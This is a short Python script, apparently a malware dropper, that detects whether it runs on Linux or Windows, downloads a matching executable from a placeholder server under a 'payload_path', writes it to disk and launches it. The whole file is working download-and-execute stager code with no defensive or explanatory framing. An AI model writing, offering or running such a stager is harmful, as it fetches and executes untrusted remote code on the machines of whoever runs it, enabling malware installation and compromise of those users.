import subprocess
import platform
import requests
import os

# Detect Operational System
platform_os = platform.system()
platform_name = os.name
# Set Filename to Download and Execcute:
if platform_os == "Linux" or platform_name == "posix":
    filename = "Linux Executable Name"
elif platform_os == "Windows" or platform_name == "nt":
    filename = "Windows Exe Name.exe"

# Donwload:
data = requests.get("http://your-server.com/payload_path/{0}".format(filename))
# Save
with open(filename, "wb") as fl:
    fl.write(data.content)
# Run:
subprocess.Popen(args="", executable=filename)
